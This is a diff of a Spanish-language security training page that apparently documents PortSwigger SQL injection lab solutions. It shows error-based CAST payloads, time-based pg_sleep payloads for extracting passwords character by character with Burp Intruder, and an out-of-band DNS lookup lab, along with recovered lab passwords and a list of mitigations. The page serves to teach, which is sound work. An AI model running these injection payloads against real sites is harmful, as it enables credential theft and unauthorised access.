@@ -1,265 +1,166 @@
- 
+ <!DOCTYPE html>
+<html lang="es">
 
-SQL injection UNION attack, retrieving data from other tables 
+<head>
+<meta charset="UTF-8">
+<title>Lab 13 - Visible Error-Based SQL Injection</title>
 
-Nivel: Intermedio (Practitioner) 
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
 
-Tipo de SQLi: Inyección SQL Basada en Errores Visibles (Visible Error-based / In-band SQLi) 
+<body>
 
-Objetivo: Comprometer la cuenta del usuario administrator forzando a la base de datos a revelar sus credenciales en texto plano a través de los mensajes de error devueltos en la respuesta HTTP. 
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
 
-Vulnerabilidad: La aplicación carece de un manejo seguro de excepciones (Custom Error Pages). En lugar de atrapar los errores internos del motor de base de datos y mostrar un mensaje genérico al usuario, el servidor refleja el error crudo (verbose error) en el frontend. Esto permite a un atacante inyectar funciones de conversión de tipos de datos incompatibles (Type Casting) para que, al fallar, el motor SQL imprima el dato confidencial evaluado directamente en el texto del error. 
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
 
-Procedimiento: 
+<section class="activities-section">
 
-Entramos al laboratorio navegando por el sitio sin ningún cambio visible, capturamos una request para editar su Cookie, y lo primero que hicimos fue agregar una única comilla simple al final del código, lo cual causo que la pagina nos retornara un texto de error SQL, este error fue crítico para el reconocimiento, ya que reveló la estructura exacta de la consulta SQL subyacente y confirmó que nuestra inyección ocurría dentro de una cadena delimitada por comillas simples. 
+<div class="activities-container">
 
- 
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 13</h2>
+<p>Visible Error-based SQL Injection</p>
+</div>
 
- 
 
-Haciendo pruebas, comentamos la consulta agregando -- al final de la comilla simple para descartar entradas posteriores, lo que nos regresó la página sin ningún problema, indicando que el error evidentemente es por sintaxis, y confirmamos el control de las consultas. 
+<div class="info-card">
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
 
-Adaptamos nuestro payload a una consulta genérica con SELECT, casteando el valor a INT 
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo de SQLi:</strong> Visible Error-based / In-band SQL Injection</p>
 
-TrackingId=C7O7mZ66ZdK9gsws' AND CAST((SELECT 1) AS int)-- 
+</div>
 
-Con esto, buscamos que los errores nos comuniquen el estado de la BD, el resultado de nuestro payload fue un error en el argumento AND, el cual nos dice que tiene que ser booleano, por lo cual, adaptaremos nuestra consulta. 
 
- 
+<div class="info-card">
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
 
- 
+<p>
+Comprometer la cuenta del usuario <strong>administrator</strong>
+forzando al motor de base de datos a revelar información sensible
+mediante mensajes de error visibles.
+</p>
 
-Cambiamos la consulta a una simple comparación  
+</div>
 
-TrackingId=C7O7mZ66ZdK9gsws' AND 1=CAST((SELECT 1) AS int)-- 
 
-Con esta consulta, nos regreso a la pagina principal, dando por verdadera la consulta, esto no nos ayuda ya que no tenemos retroalimentación de lo que estamos consultando, por lo cual debemos de seguir trabajando mediante errores, ahora, usaremos otra consulta genérica SELECT a la tabla de usuarios 
+<div class="info-card">
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
 
-TrackingId=C7O7mZ66ZdK9gsws ' AND 1=CAST((SELECT username FROM users) AS int)— 
+<p>
+La aplicación no maneja correctamente las excepciones del motor SQL
+y muestra errores completos en el frontend.
+</p>
 
-Con esto conseguimos la retroalimentación del error, en este caso, nos esta diciendo que la respuesta esta truncada, el servidor tenía un límite máximo de caracteres para el valor de la cookie, cortando los caracteres del final. 
+<p>
+Esto permite provocar errores de conversión de tipo
+para que el valor evaluado aparezca dentro del mensaje de error.
+</p>
 
- 
+</div>
 
-Como el código de la sesión se inyecta en la BD para hacer las consultas, esto nos dice que no necesitamos el código de la cookie para comunicarnos con el servidor, por lo cual lo eliminaremos para ahorrar espacio, teniendo todo el limite de la variable disponible para inyectar consultas. 
 
- 
+<div class="info-card">
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
 
-Mandando la sesión sin código, notamos que si esta ejecutando las consultas, pero seguimos teniendo un error dado porque la consulta devuelve múltiples filas, dado que CAST solo puede operar sobre un valor único a la vez, se añadió la cláusula LIMIT 1 para aislar el primer registro de la tabla 
+<p><strong>Paso 1 — Confirmar SQL Injection</strong></p>
 
-TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)— 
+<pre>
+TrackingId='
+</pre>
 
-Con esta consulta veremos al primer usuario dentro de la tabla, la base de datos tomó el valor extraído, intentó convertir esa cadena de texto en un número entero (debido a la instrucción AS int), falló estrepitosamente y escupió la palabra exacta en el reporte de error. 
+<p>
+El servidor devuelve un error SQL,
+confirmando que la inyección es posible.
+</p>
 
- 
 
-Con esto ya sabemos que el administrador es el primero en la tabla, solo falta diseñar una nueva consulta para que el error ahora nos escupa su contraseña 
+<p><strong>Paso 2 — Controlar la consulta</strong></p>
 
-TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)— 
+<pre>
+TrackingId='--
+</pre>
 
-Con esta consulta, el servidor nos arrojara la contraseña del administrador en el error. 
+<p>
+La página carga correctamente,
+confirmando que podemos comentar la consulta.
+</p>
 
- 
 
-El servidor arrojó un nuevo error de sintaxis que contenía la contraseña en texto plano del administrador, la cual nos dice que es i3rpmtbwp1xi74smj59z, con esto concluimos la penetración y procedemos a revisar que las credenciales nos permitan acceder de manera exitosa. 
+<p><strong>Paso 3 — Probar conversión de tipos</strong></p>
 
- 
+<pre>
+TrackingId=' AND 1=CAST((SELECT 1) AS int)--
+</pre>
 
-Con esto concluimos el Laboratorio 13. 
+<p>
+La consulta se ejecuta sin errores.
+</p>
 
- 
 
- SQL Injection attack, querying the database type version on Oracle  
+<p><strong>Paso 4 — Extraer el username</strong></p>
 
-Nivel: PRACTITIONER  
+<pre>
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+</pre>
 
-Tipo de SQLi: Blind SQL Injection basada en tiempo (Time‑based) 
+<p>
+El servidor intenta convertir el texto en número
+y muestra el valor en el error.
+</p>
 
-Objetivo: Explotar una vulnerabilidad de SQL Injection para forzar un retraso de 10 segundos en la respuesta del servidor, demostrando que la consulta SQL se ejecuta de forma síncrona. 
 
-Vulnerabilidad: La aplicación utiliza una cookie de seguimiento (tracking cookie) para análisis. El valor de esta cookie se inserta directamente en una consulta SQL sin validación, permitiendo inyectar condiciones que generen retrasos temporales.  
+<p><strong>Paso 5 — Extraer la contraseña</strong></p>
 
-Procedimiento:  
+<pre>
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+</pre>
 
-Paso 1: Ingresar a la plataforma y acceder al entorno del laboratorio. 
+<p>
+El error revela la contraseña:
+</p>
 
-  
+<pre>
+i3rpmtbwp1xi74smj59z
+</pre>
 
-  
+</div>
 
-  
 
-  
+<div class="info-card">
 
-  
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
 
-  
+<ul>
 
-Paso 2: Copiar la URL proporcionada para el entorno de pruebas. 
+<li>Uso de consultas parametrizadas.</li>
 
-Paso 4: Pegar el enlace del laboratorio en el navegador de Burp Suite para capturar las peticiones HTTP en el proxy. 
+<li>Manejo seguro de excepciones.</li>
 
- 
+<li>No mostrar errores SQL al usuario.</li>
 
-Paso 5: Analizar el historial de tráfico e identificar la petición HTTP que contiene la cookie de seguimiento (TrackingId). 
+<li>Principio de mínimo privilegio.</li>
 
- Paso 6: Enviar esta petición al módulo "Repeater" de Burp Suite para manipularla y probar las inyecciones SQL de forma manual y controlada. 
+</ul>
 
- 
+</div>
 
-Paso 7: Consultar la documentación de ayuda del laboratorio en la sección "Time delays" (Retrasos de tiempo) para estructurar el payload adecuado. 
 
-  
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
 
-Paso 8: Modificar la cookie TrackingId. Agregamos una comilla simple (') después del valor numérico, inyectamos el comando de retraso concatenando con el signo + (en lugar de espacios) y finalizamos con doble guion (--) para comentar el resto de la consulta original. 
-
-Paso 9: Al enviar la petición modificada, observamos en el Repeater un retraso de respuesta de 10 segundos exactos 
-
-. 
-
-Al enviarlo efectivamente hace un retraso de 10 segundos dándonos el laboratorio como resuelto 
-
- 
-
-  
-
- Blind SQL injection with time delays and information retrieval 
-
-Nivel: PRACTITIONER  
-
-Tipo de SQLi: Blind SQL Injection basada en tiempo (Time-based) y recuperación de información.  
-
-Objetivo: Explotar una vulnerabilidad de inyección SQL basada en tiempo para inferir, carácter por carácter, la contraseña del usuario administrator y lograr el acceso a la plataforma.  
-
-Vulnerabilidad: La aplicación utiliza una cookie de seguimiento (TrackingId) que se inserta de forma insegura en una consulta SQL síncrona. Como la base de datos es PostgreSQL, podemos inyectar la función pg_sleep() para forzar retrasos de tiempo condicionales. Al medir cuánto tarda en responder el servidor, podemos deducir si una condición inyectada es verdadera o falsa, permitiéndonos extraer datos a ciegas. 
-
-Procedimiento: 
-
-Paso 1: Iniciar el laboratorio y revisar las especificaciones de la vulnerabilidad objetivo. 
-
-  
-
-Paso 2: Abrir Burp Suite para preparar el entorno de pruebas. 
-
-Paso 3: Pegar el enlace del laboratorio en el navegador de Burp Suite para capturar la navegación. 
-
-  
-
- 
-
-Paso 4: Identificar la petición HTTP que contiene la cookie TrackingId, ya que este será nuestro lugar de inyección. 
-
- 
-
-Paso 5: Enviar la petición al "Repeater". Al probar enviarla sin modificaciones, observamos una respuesta HTML estándar. 
-
-Paso 6: Aplicar el primer payload de inyección: '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--. Al enviarlo, comprobamos que el servidor tarda 10 segundos en responder. (Nota para tu reporte: Esta consulta usa %3B (un punto y coma ; codificado) para iniciar una nueva instrucción. Evalúa la condición CASE WHEN (1=1). Como 1 siempre es igual a 1, ejecuta pg_sleep(10) pausando la base de datos por 10 segundos. El doble guion -- comenta el resto de la consulta original para evitar errores). 
-
- 
-
-Paso 7: Para validar la inyección condicional, enviamos un segundo payload: '%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--. Como 1 no es igual a 2, la aplicación responde inmediatamente sin demora. 
-
-Paso 8: Enviamos la petición al "Intruder" para realizar un ataque de prueba enfocado en determinar la longitud de la contraseña del administrador. 
-
- Paso 9: Configuramos el payload como un contador numérico (del 1 al 26, con incrementos de 1) usando la función LENGTH(password)>§1§ para analizar las variaciones en las respuestas. 
-
-Paso 10: Tras ejecutar el ataque, notamos que a partir de la longitud 20 el tiempo de respuesta cambia, lo que nos confirma que la contraseña tiene exactamente 20 caracteres. 
-
-Paso 11: Volvemos al Repeater para preparar la inyección de extracción de datos. El payload será: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--. Esto extraerá un solo carácter de la contraseña a la vez para compararlo con un valor específico. 
-
-Paso 12: Enviamos esta nueva petición al Intruder para ejecutar un ataque tipo "Cluster Bomb", el cual nos permitirá iterar sobre cada posición y carácter. 
-
-Paso 13: Configuramos dos payloads: el primero actuará como un contador para la posición (del 1 al 20) y el segundo realizará fuerza bruta probando cada posible carácter en esa posición. 
-
-Paso 14: En la pestaña "Resource pool", configuramos un máximo de 1 solicitud concurrente (Maximum concurrent requests: 1). Esto es vital para evitar falsos positivos en ataques basados en tiempo. 
-
- 
-
-  
-
-  
-
-Paso 15: Asignamos los marcadores de posición (§) en la consulta: el primero en el número de posición del SUBSTRING y el segundo en la letra a comparar, y comenzamos el ataque. 
-
-Paso 16: Al concluir el ataque, ordenamos los resultados por la columna "Response received" (tiempo de respuesta), enfocándonos en las peticiones que tardaron más de 5000 milisegundos. 
-
-Paso 17: Recopilamos los caracteres correspondientes a las posiciones que dieron positivo (retraso largo), obteniendo la contraseña completa: tmmowcfokak4zmj52ky0. 
-
-  
-
-  
-
-  
-
-Paso 18: Regresamos al navegador, ingresamos a la sección "My account", utilizamos el usuario administrator y la contraseña extraída. Accedemos exitosamente, concluyendo el laboratorio. 
-
-Lab: Blind SQL injection with out-of-band interaction. 
-
-Nivel: Intermedio (Practitioner). 
-
-Tipo de SQLi:  inyección SQL fuera de banda. 
-
-Objetivo: Explotar una vulnerabilidad de inyección SQL en una cookie de seguiminto, causando una busqueda DNS en Burp Collaborator. 
-
-Vulnerabilidad: Cookie de Rastreo; Puede modificarse cambiándola por una carga útil, la cual es una mezcla en la inyección SQL con una técnica XXE (XAML External Entity) que activa una interacción con el servidor Burp Collaborator. Esta técnica aprovecha configuraciones débiles en los analizadores XML para leer archivos locales, realizar peticiones a redes internas o ejecutar código. 
-
-Procedimiento:  
-
-Antes de comenzar se avisa que para esta práctica es necesario utilizar la versión profesional de Burpsuit. 
-
- 
-
-Se envían todas las solicitudes HTTP que realiza el navegador.  
-
-Posterior se manda al Repeater la solicitud HTTP de la página de inicio del sitio. En el repeater se observa la respuesta del sitio al enviar dicha solicitud. En cookies se encuentra el tracking_id, la vulnerabilidad que tenemos a la mano para poder explotar el sitio. 
-
- 
-
- 
-
-Posteriormente, se genera un “Burp Collaborator Client”. La herramienta principal para este laboratorio. Un subdominio específico del colaborador, este permite detectar vulnerabilidades que no devuelven una respuesta directa en el sitio web.   
-
-Esto genera un subdominio único del Burp Colaborator Client, el cual nos servirá más tarde para obtener el resultado de la busqueda DNS. Con la herramienta el subdominio se sondea para confirmar que la busqueda DNS se haya realizado. 
-
- 
-
- 
-
-Pista de la actividad. 
-
-Nos sugiere indagar en el “acordeón” de inyección SQL. 
-
-La parte que nos interesa es la sección de búsqueda DNS 
-
- 
-
-El XXE que nos interesa en este caso es de la versión para bases de datos de Oracle. Existen dos versiones este, uno para versiones aún sin parchar y otro para versiones parchadas, pero este requiere tener privilegios elevados para realizarse. 
-
- 
-
- 
-
-Esta es la carga útil que mezclaremos con la consulta de la cookie de rastreo. Incluyendo el subdominio generado. Con este, el servidor de la base de datos se ve obligado a una petición DNS  y HTTP hacia nuestro subdominio. 
-
-La función del payload no es “tomar información” si no actuar como un radar,  forzando a la base de datos a llamar al servidor. 
-
- 
-
- 
-
-Se le agrega la comilla simple para cerrar la cadena de texto original de la cookie de seguimiento. Lo que podría ser una consulta similar a esta: 
-
-SELECT tracking_id FROM analytics WHERE tracking_id = “ cadena de la cookie”. 
-
-AL colocar la comilla al principio del payload cierra el valor de la cookie, preparando la consulta para inyectar el código malicioso. 
-
-Posterior a esto utilizamos el operador OR que sirve para concatenación, uniendo el resultado de la consulta original con el de la consulta inyectada.  
-
-Al enviar la petición en el Repeater, sondeamos las interacciones que ha tenido el subdominio y se encuentra lo siguiente: 
-
- 
-
-Por el nombre del dominio y el IP corroboramos que se logró realizar la busqueda con éxito. Lo que muestra que el laboratorio ha sido completado. 
-
+</div>
+</section>
+</body>
+</html>
  
